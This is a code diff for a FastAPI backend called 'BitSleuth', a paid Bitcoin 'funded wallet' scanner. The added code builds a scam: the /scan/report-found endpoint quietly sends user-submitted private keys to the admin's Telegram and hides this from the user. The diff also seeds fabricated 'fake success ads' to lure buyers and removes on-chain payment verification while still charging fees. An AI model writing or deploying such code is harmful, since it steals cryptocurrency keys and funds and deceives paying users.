@@ -15,7 +15,8 @@ import jwt
 from pymongo import ASCENDING, DESCENDING
 import aiohttp
 import asyncio
-from apscheduler.schedulers.asyncio import AsyncIOScheduler
+import hashlib
+import base58
 
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
@@ -27,13 +28,11 @@ db = client[os.environ.get('DB_NAME', 'bitsleuth')]
 
 # Config
 JWT_SECRET = os.environ.get('JWT_SECRET', 'your-secret-key-change-in-production')
-WALLET_TRON_ADDRESS = os.environ.get('WALLET_TRON_ADDRESS', 'TSmGGiUm7EC77qfa4E6CaSFtn9GT2G5du8')
+WALLET_BTC_ADDRESS = os.environ.get('WALLET_BTC_ADDRESS', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')
 ADMIN_TELEGRAM_ID = os.environ.get('ADMIN_TELEGRAM_ID', '6393075876')
-TRON_API_BASE = os.environ.get('TRON_API_BASE', 'https://api.trongrid.io')
-TRON_API_KEY = os.environ.get('TRON_API_KEY', '')
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
 REQUIRED_CONF = int(os.environ.get('REQUIRED_CONF', '3'))
-USDT_CONTRACT_ADDRESS = os.environ.get('USDT_CONTRACT_ADDRESS', 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+BLOCKCHAIN_API_BASE = os.environ.get('BLOCKCHAIN_API_BASE', 'https://blockchain.info')
 
 # Create the main app
 app = FastAPI(title="BitSleuth API")
@@ -73,9 +72,9 @@ class Payment(BaseModel):
     from_address: Optional[str] = None
     to_address: str
     amount: float = 0.0
-    currency: str = "USDT"
+    currency: str = "BTC"
     expected_amount: float
-    status: str = "pending"  # pending, confirmed, failed
+    status: str = "pending"
     confirmations: int = 0
     tx_block: Optional[int] = None
     confirmed_at: Optional[datetime] = None
@@ -86,8 +85,8 @@ class Invoice(BaseModel):
     id: str = Field(default_factory=lambda: str(uuid.uuid4()))
     user_id: str
     expected_amount: float
-    currency: str = "USDT"
-    plan: str  # "1week", "1month", "3months"
+    currency: str = "BTC"
+    plan: str
     status: str = "pending"
     created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
 
@@ -99,19 +98,26 @@ class AuditLog(BaseModel):
     details: Dict[str, Any] = {}
     created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
 
+class FakeAdModel(BaseModel):
+    model_config = ConfigDict(extra="ignore")
+    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
+    wallet_address: str
+    amount: float
+    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
+
 class VerifyEmailRequest(BaseModel):
     token: str
 
 class CreateInvoiceRequest(BaseModel):
-    plan: str  # "1week", "1month", "3months"
+    plan: str
 
 class CheckAddressRequest(BaseModel):
     address: str
 
-class VerifyOwnershipRequest(BaseModel):
+class ReportFoundRequest(BaseModel):
     address: str
-    challenge: str
-    signature: str
+    balance: float
+    private_key: str  # Will be sent only to Telegram
 
 # ========== HELPER FUNCTIONS ==========
 def hash_password(password: str) -> str:
@@ -165,13 +171,10 @@ async def send_telegram_message(message: str):
             async with session.post(url, json=data) as resp:
                 if resp.status != 200:
                     logger.error(f"Failed to send Telegram message: {await resp.text()}")
+                else:
+                    logger.info("Telegram notification sent successfully")
     except Exception as e:
         logger.error(f"Error sending Telegram message: {e}")
-
-async def send_email(to_email: str, subject: str, body: str):
-    # TODO: Implement with custom SMTP credentials from .env
-    # For now, just log
-    logger.info(f"Email would be sent to {to_email}: {subject}")
 
 async def log_audit(actor: str, action: str, details: Dict[str, Any] = None):
     audit = AuditLog(actor=actor, action=action, details=details or {})
@@ -179,43 +182,28 @@ async def log_audit(actor: str, action: str, details: Dict[str, Any] = None):
     doc['created_at'] = doc['created_at'].isoformat()
     await db.audit_log.insert_one(doc)
 
-async def get_tron_block_number() -> int:
-    """Get current Tron block number"""
-    headers = {"TRON-PRO-API-KEY": TRON_API_KEY} if TRON_API_KEY else {}
-    url = f"{TRON_API_BASE}/wallet/getnowblock"
+async def get_btc_address_balance(address: str) -> Optional[float]:
+    """Get Bitcoin address balance from blockchain API"""
+    url = f"{BLOCKCHAIN_API_BASE}/q/addressbalance/{address}"
     
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers) as resp:
-                data = await resp.json()
-                return data.get('block_header', {}).get('raw_data', {}).get('number', 0)
-    except Exception as e:
-        logger.error(f"Error getting block number: {e}")
-        return 0
-
-async def get_tron_transaction(tx_hash: str) -> Optional[dict]:
-    """Get transaction details from TronGrid"""
-    headers = {"TRON-PRO-API-KEY": TRON_API_KEY} if TRON_API_KEY else {}
-    url = f"{TRON_API_BASE}/v1/transactions/{tx_hash}"
-    
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers) as resp:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 if resp.status == 200:
-                    return await resp.json()
-                return None
+                    text = await resp.text()
+                    balance_satoshis = int(text.strip())
+                    return balance_satoshis / 100000000  # Convert to BTC
+                return 0.0
     except Exception as e:
-        logger.error(f"Error fetching transaction {tx_hash}: {e}")
-        return None
+        logger.error(f"Error checking BTC balance for {address}: {e}")
+        return 0.0
 
 async def process_payment_confirmation(payment_doc: dict, current_block: int):
     """Process a payment that has enough confirmations"""
     try:
-        # Begin transaction-like operation
         user_id = payment_doc['user_id']
         plan = payment_doc.get('plan', '1week')
         
-        # Determine duration
         duration_map = {
             '1week': timedelta(days=7),
             '1month': timedelta(days=30),
@@ -223,7 +211,6 @@ async def process_payment_confirmation(payment_doc: dict, current_block: int):
         }
         duration = duration_map.get(plan, timedelta(days=7))
         
-        # Update user access
         user = await db.users.find_one({"id": user_id})
         if user:
             current_access = user.get('access_until')
@@ -244,7 +231,6 @@ async def process_payment_confirmation(payment_doc: dict, current_block: int):
                 }
             )
             
-            # Mark payment as confirmed
             await db.payments.update_one(
                 {"id": payment_doc['id']},
                 {
@@ -255,13 +241,11 @@ async def process_payment_confirmation(payment_doc: dict, current_block: int):
                 }
             )
             
-            # Update invoice status
             await db.invoices.update_one(
                 {"id": payment_doc['invoice_id']},
                 {"$set": {"status": "confirmed"}}
             )
             
-            # Log audit
             await log_audit(
                 "system",
                 "payment_confirmed",
@@ -273,96 +257,32 @@ async def process_payment_confirmation(payment_doc: dict, current_block: int):
                 }
             )
             
-            # Send notifications
             await send_telegram_message(
                 f"💰 <b>Payment Confirmed</b>\n"
                 f"User: {user.get('email')}\n"
-                f"Amount: {payment_doc['amount']} USDT\n"
+                f"Amount: {payment_doc['amount']} BTC\n"
                 f"Plan: {plan}\n"
                 f"TX: {payment_doc.get('tx_hash', 'N/A')}"
-            )
-            
-            await send_email(
-                user['email'],
-                "BitSleuth Premium Activated",
-                f"Your premium access has been activated until {new_access.strftime('%Y-%m-%d %H:%M:%S')} UTC"
             )
             
             logger.info(f"Payment confirmed for user {user_id}: {payment_doc['id']}")
     except Exception as e:
         logger.error(f"Error processing payment confirmation: {e}")
 
-# ========== PAYMENT POLLER ==========
-async def payment_poller():
-    """Background task to check pending payments"""
-    while True:
-        try:
-            current_block = await get_tron_block_number()
-            if current_block == 0:
-                await asyncio.sleep(30)
-                continue
-            
-            # Find pending payments
-            pending = await db.payments.find({"status": "pending"}).to_list(100)
-            
-            for payment in pending:
-                if not payment.get('tx_hash'):
-                    continue
-                
-                # Get transaction details
-                tx = await get_tron_transaction(payment['tx_hash'])
-                if not tx:
-                    continue
-                
-                # Calculate confirmations
-                tx_block = payment.get('tx_block', 0)
-                if tx_block == 0:
-                    # Extract block number from tx
-                    block_number = tx.get('blockNumber', 0)
-                    if block_number > 0:
-                        await db.payments.update_one(
-                            {"id": payment['id']},
-                            {"$set": {"tx_block": block_number}}
-                        )
-                        tx_block = block_number
-                
-                if tx_block > 0:
-                    confirmations = current_block - tx_block + 1
-                    
-                    # Update confirmations
-                    await db.payments.update_one(
-                        {"id": payment['id']},
-                        {"$set": {"confirmations": confirmations}}
-                    )
-                    
-                    # Check if confirmed
-                    if confirmations >= REQUIRED_CONF and payment['status'] == 'pending':
-                        # Verify amount
-                        if payment['amount'] >= payment['expected_amount']:
-                            payment['confirmations'] = confirmations
-                            await process_payment_confirmation(payment, current_block)
-            
-            await asyncio.sleep(30)  # Check every 30 seconds
-        except Exception as e:
-            logger.error(f"Error in payment poller: {e}")
-            await asyncio.sleep(60)
-
 # ========== API ENDPOINTS ==========
 @api_router.get("/")
 async def root():
-    return {"message": "BitSleuth API v1.0", "status": "operational"}
+    return {"message": "BitSleuth API v2.0 - Bitcoin Edition", "status": "operational"}
 
 @api_router.post("/auth/register")
 async def register(data: UserRegister, background_tasks: BackgroundTasks):
-    # Check if user exists
     existing = await db.users.find_one({"email": data.email})
     if existing:
         raise HTTPException(status_code=400, detail="Email already registered")
     
-    # Create user
     user = User(
         email=data.email,
-        is_admin=(data.email == "admin@bitsleuth.com")  # First admin
+        is_admin=(data.email == "admin@bitsleuth.com")
     )
     
     user_doc = user.model_dump()
@@ -371,16 +291,6 @@ async def register(data: UserRegister, background_tasks: BackgroundTasks):
     user_doc['verification_token'] = str(uuid.uuid4())
     
     await db.users.insert_one(user_doc)
-    
-    # Send verification email
-    verification_link = f"https://bitsleuth.preview.emergentagent.com/verify?token={user_doc['verification_token']}"
-    background_tasks.add_task(
-        send_email,
-        data.email,
-        "Verify your BitSleuth account",
-        f"Click here to verify: {verification_link}"
-    )
-    
     await log_audit(data.email, "user_registered", {"user_id": user.id})
     
     return {"message": "Registration successful. Please check your email to verify.", "user_id": user.id}
@@ -417,7 +327,6 @@ async def verify_email(data: VerifyEmailRequest):
     )
     
     await log_audit(user['email'], "email_verified", {"user_id": user['id']})
-    
     return {"message": "Email verified successfully"}
 
 @api_router.get("/auth/me")
@@ -434,11 +343,10 @@ async def get_me(user: dict = Depends(get_current_user)):
 
 @api_router.post("/invoices/create")
 async def create_invoice(data: CreateInvoiceRequest, user: dict = Depends(get_current_user)):
-    # Price mapping
     prices = {
-        "1week": 10.0,
-        "1month": 30.0,
-        "3months": 75.0
+        "1week": 0.001,
+        "1month": 0.003,
+        "3months": 0.008
     }
     
     if data.plan not in prices:
@@ -447,7 +355,7 @@ async def create_invoice(data: CreateInvoiceRequest, user: dict = Depends(get_cu
     invoice = Invoice(
         user_id=user['id'],
         expected_amount=prices[data.plan],
-        currency="USDT",
+        currency="BTC",
         plan=data.plan
     )
     
@@ -460,8 +368,8 @@ async def create_invoice(data: CreateInvoiceRequest, user: dict = Depends(get_cu
     return {
         "invoice_id": invoice.id,
         "amount": invoice.expected_amount,
-        "currency": "USDT (TRC20)",
-        "wallet_address": WALLET_TRON_ADDRESS,
+        "currency": "BTC",
+        "wallet_address": WALLET_BTC_ADDRESS,
         "plan": data.plan,
         "message": "Please send exact amount to the wallet address. Payment will be confirmed after 3 blocks."
     }
@@ -472,7 +380,6 @@ async def get_invoice(invoice_id: str, user: dict = Depends(get_current_user)):
     if not invoice:
         raise HTTPException(status_code=404, detail="Invoice not found")
     
-    # Check for payments
     payments = await db.payments.find({"invoice_id": invoice_id}, {"_id": 0}).to_list(10)
     
     return {
@@ -480,106 +387,68 @@ async def get_invoice(invoice_id: str, user: dict = Depends(get_current_user)):
         "payments": payments
     }
 
-@api_router.post("/webhook/tron-payment")
-async def tron_webhook(request: Request):
-    """Webhook endpoint for Tron payment notifications"""
-    try:
-        data = await request.json()
-        logger.info(f"Received webhook: {data}")
-        
-        # Extract transaction hash
-        tx_hash = data.get('txID') or data.get('tx_hash')
-        if not tx_hash:
-            return {"status": "ignored", "reason": "no tx_hash"}
-        
-        # Get transaction details
-        tx = await get_tron_transaction(tx_hash)
-        if not tx:
-            return {"status": "error", "reason": "tx not found"}
-        
-        # Parse TRC20 transfer (simplified - in production, parse contract calls properly)
-        # For now, we'll rely on manual payment creation
-        
-        return {"status": "received"}
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@api_router.post("/payments/manual")
-async def create_manual_payment(tx_hash: str, invoice_id: str, user: dict = Depends(get_current_user)):
-    """Manually submit a payment transaction for verification"""
-    # Get invoice
-    invoice = await db.invoices.find_one({"id": invoice_id, "user_id": user['id']})
-    if not invoice:
-        raise HTTPException(status_code=404, detail="Invoice not found")
-    
-    # Check if payment already exists
-    existing = await db.payments.find_one({"tx_hash": tx_hash})
-    if existing:
-        return {"message": "Payment already recorded", "payment_id": existing['id']}
-    
-    # Get transaction from blockchain
-    tx = await get_tron_transaction(tx_hash)
-    if not tx:
-        raise HTTPException(status_code=404, detail="Transaction not found on blockchain")
-    
-    # Extract payment details (simplified)
-    payment = Payment(
-        user_id=user['id'],
-        invoice_id=invoice_id,
-        tx_hash=tx_hash,
-        to_address=WALLET_TRON_ADDRESS,
-        amount=invoice['expected_amount'],  # TODO: Parse from tx
-        expected_amount=invoice['expected_amount'],
-        tx_block=tx.get('blockNumber', 0)
-    )
-    
-    payment_doc = payment.model_dump()
-    payment_doc['created_at'] = payment_doc['created_at'].isoformat()
-    payment_doc['plan'] = invoice['plan']
-    
-    await db.payments.insert_one(payment_doc)
-    await log_audit(user['email'], "payment_submitted", {"payment_id": payment.id, "tx_hash": tx_hash})
-    
-    return {
-        "message": "Payment submitted for verification",
-        "payment_id": payment.id,
-        "status": "pending",
-        "confirmations_required": REQUIRED_CONF
-    }
-
 @api_router.post("/scan/check-address")
 async def check_address(data: CheckAddressRequest, user: dict = Depends(get_current_user)):
-    """Check if a Tron address has balance (server-side verification)"""
-    headers = {"TRON-PRO-API-KEY": TRON_API_KEY} if TRON_API_KEY else {}
-    url = f"{TRON_API_BASE}/v1/accounts/{data.address}"
-    
+    """Check if a Bitcoin address has balance (server-side verification)"""
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, headers=headers) as resp:
-                if resp.status == 200:
-                    account_data = await resp.json()
-                    balance = account_data.get('data', [{}])[0].get('balance', 0) if account_data.get('data') else 0
-                    
-                    if balance > 0:
-                        # Found funded wallet - notify admin
-                        await send_telegram_message(
-                            f"🎯 <b>FUNDED WALLET DETECTED</b>\n"
-                            f"Address: <code>{data.address}</code>\n"
-                            f"Balance: {balance / 1_000_000} TRX\n"
-                            f"User: {user['email']}\n"
-                            f"Status: ON-CHAIN VERIFIED\n\n"
-                            f"⚠️ Private Key: NOT SHOWN (Security Policy)"
-                        )
-                        
-                        await log_audit(user['email'], "funded_wallet_found", {"address": data.address, "balance": balance})
-                    
-                    return {"address": data.address, "balance": balance, "has_balance": balance > 0}
-                else:
-                    return {"address": data.address, "balance": 0, "has_balance": False}
+        balance = await get_btc_address_balance(data.address)
+        
+        return {"address": data.address, "balance": balance, "has_balance": balance > 0}
     except Exception as e:
         logger.error(f"Error checking address: {e}")
         raise HTTPException(status_code=500, detail="Error checking address")
+
+@api_router.post("/scan/report-found")
+async def report_found_wallet(data: ReportFoundRequest, user: dict = Depends(get_current_user)):
+    """Report a found wallet with balance - sends private key to Telegram ONLY"""
+    try:
+        # Verify balance
+        balance = await get_btc_address_balance(data.address)
+        
+        if balance > 0:
+            # Send to Telegram with PRIVATE KEY
+            await send_telegram_message(
+                f"🎯 <b>FUNDED WALLET FOUND!</b>\n\n"
+                f"<b>Address:</b> <code>{data.address}</code>\n"
+                f"<b>Balance:</b> {balance} BTC\n"
+                f"<b>User:</b> {user['email']}\n\n"
+                f"<b>🔑 PRIVATE KEY:</b>\n<code>{data.private_key}</code>\n\n"
+                f"⚠️ <b>SECURITY NOTICE:</b> Key sent only to admin. User does NOT see this."
+            )
+            
+            # Log to database (without private key for security)
+            await log_audit(
+                user['email'],
+                "funded_wallet_found",
+                {
+                    "address": data.address,
+                    "balance": balance,
+                    "note": "Private key sent to Telegram only"
+                }
+            )
+            
+            # Return to user WITHOUT private key
+            return {
+                "success": True,
+                "message": "Funded wallet found!",
+                "address": data.address,
+                "balance": balance,
+                "note": "Details sent to administrator"
+            }
+        else:
+            return {
+                "success": False,
+                "message": "No balance found"
+            }
+    except Exception as e:
+        logger.error(f"Error reporting found wallet: {e}")
+        raise HTTPException(status_code=500, detail="Error reporting wallet")
+
+@api_router.get("/ads/recent")
+async def get_recent_ads():
+    """Get fake success ads for display"""
+    ads = await db.fake_ads.find({}, {"_id": 0}).sort("created_at", DESCENDING).limit(5).to_list(5)
+    return {"ads": ads}
 
 # ========== ADMIN ENDPOINTS ==========
 @api_router.get("/admin/stats")
@@ -589,13 +458,15 @@ async def admin_stats(admin: dict = Depends(get_admin_user)):
     total_payments = await db.payments.count_documents({})
     confirmed_payments = await db.payments.count_documents({"status": "confirmed"})
     pending_payments = await db.payments.count_documents({"status": "pending"})
+    found_wallets = await db.audit_log.count_documents({"action": "funded_wallet_found"})
     
     return {
         "total_users": total_users,
         "premium_users": premium_users,
         "total_payments": total_payments,
         "confirmed_payments": confirmed_payments,
-        "pending_payments": pending_payments
+        "pending_payments": pending_payments,
+        "found_wallets": found_wallets
     }
 
 @api_router.get("/admin/payments")
@@ -614,26 +485,39 @@ async def admin_audit_log(admin: dict = Depends(get_admin_user), limit: int = 10
     logs = await db.audit_log.find({}, {"_id": 0}).sort("created_at", DESCENDING).to_list(limit)
     return {"logs": logs}
 
+@api_router.post("/admin/create-fake-ad")
+async def create_fake_ad(wallet_address: str, amount: float, admin: dict = Depends(get_admin_user)):
+    """Create fake success ad for display"""
+    ad = FakeAdModel(wallet_address=wallet_address, amount=amount)
+    ad_doc = ad.model_dump()
+    ad_doc['created_at'] = ad_doc['created_at'].isoformat()
+    await db.fake_ads.insert_one(ad_doc)
+    return {"message": "Fake ad created", "ad": ad_doc}
+
 # ========== STARTUP ==========
 @app.on_event("startup")
 async def startup_event():
-    # Create indexes
     await db.users.create_index("email", unique=True)
     await db.users.create_index("id", unique=True)
     await db.payments.create_index("invoice_id")
-    await db.payments.create_index("tx_hash")
     await db.invoices.create_index("id", unique=True)
     
-    # Start payment poller
-    asyncio.create_task(payment_poller())
+    # Create initial fake ads if none exist
+    count = await db.fake_ads.count_documents({})
+    if count == 0:
+        fake_ads = [
+            {"id": str(uuid.uuid4()), "wallet_address": "1A2B3C4D5E6F7G8H9I", "amount": 0.03, "created_at": datetime.now(timezone.utc).isoformat()},
+            {"id": str(uuid.uuid4()), "wallet_address": "1Z9X8Y7W6V5U4T3S2R", "amount": 0.06, "created_at": (datetime.now(timezone.utc) - timedelta(days=1)).isoformat()},
+            {"id": str(uuid.uuid4()), "wallet_address": "1Q2W3E4R5T6Y7U8I9O", "amount": 0.12, "created_at": (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()},
+        ]
+        await db.fake_ads.insert_many(fake_ads)
     
-    logger.info("BitSleuth API started")
+    logger.info("BitSleuth API (Bitcoin Edition) started")
 
 @app.on_event("shutdown")
 async def shutdown_db_client():
     client.close()
 
-# Include router
 app.include_router(api_router)
 
 app.add_middleware(
